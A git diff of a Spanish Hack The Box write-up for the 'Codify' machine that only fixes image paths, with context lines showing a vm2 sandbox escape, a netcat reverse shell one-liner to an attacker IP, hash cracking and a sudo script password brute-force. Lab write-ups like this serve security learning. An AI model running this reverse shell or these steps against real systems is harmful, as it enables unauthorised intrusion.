@@ -28,22 +28,22 @@ Realizamos un escaneo rápido de puertos y versiones de servicios a la máquina 
 └─$ nmap -p- -sV 10.10.11.239 -T5 -oN nmap.txt -vvv
 ```
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107175436.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107175436.png)
 ## Web
 
 El puerto 80 tiene un servidor http activo: 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107175901.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107175901.png)
 
 A simple vista hay tres páginas: `/limitations`, `/about`, `/editor`.
 
 El servidor contiene una aplicación web que permite testear código Node JS. Una Reverse Shell sencilla en este lenguaje no funciona por los módulos restringidos: 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107180512.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107180512.png)
 
 La aplicación funciona mediante la libreria vm2 en la versión 3.9.16. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107180126.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107180126.png)
 # Penetración 
 
 ## Web
@@ -79,7 +79,7 @@ try {
 console.log(vm.run(code));
 ```
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107181134.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107181134.png)
 
 Una vez confirmada la vulnerabilidad, el acceso es ya algo mecánico. Abrimos puerto en escucha: 
 
@@ -95,7 +95,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.78 4444 >/tmp/f
 
 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107181459.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107181459.png)
 
 Una vez dentro, vamos a necesitar, por comodidad, una shell con todas sus funciones. Habrá que ejecutar lo siguiente: 
 
@@ -112,7 +112,7 @@ export TERM=xterm
 En `/home` vemos un usuario posiblemente vulnerable: `joshua`
 En `/var/www/contact` hay un archivo SQLite con un hash en bcrypt. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107182336.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107182336.png)
 
 Con John The Ripper se tarda menos de treinta segundos en hacerse cargo de ella: 
 
@@ -131,11 +131,11 @@ Aquí está la flag `user.txt`.
 
 Para escalar privilegios vamos a revisar qué puede hacer nuestro usuario Joshua: 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107182843.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107182843.png)
 
 Parece ser que podemos ejecutar un comando con permisos sudo que pregunta por la contraseña root. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107183231.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107183231.png)
 
 Está programado con ciertas vulnerabilidades de seguridad. Al no estar las variables entre comillas, nos permite realizar que se lean como comandos y no sólo como variables.
 
@@ -163,4 +163,4 @@ while not found:
 
 Lo creamos en `/tmp`, le damos permisos de ejecución y nos da la contraseña en cuestión de minutos. 
 
-![](/assets/Images/HTB-writeup-codify/Pasted image 20231107183856.png)
+![](/assets/images/HTB-writeup-codify/Pasted image 20231107183856.png)
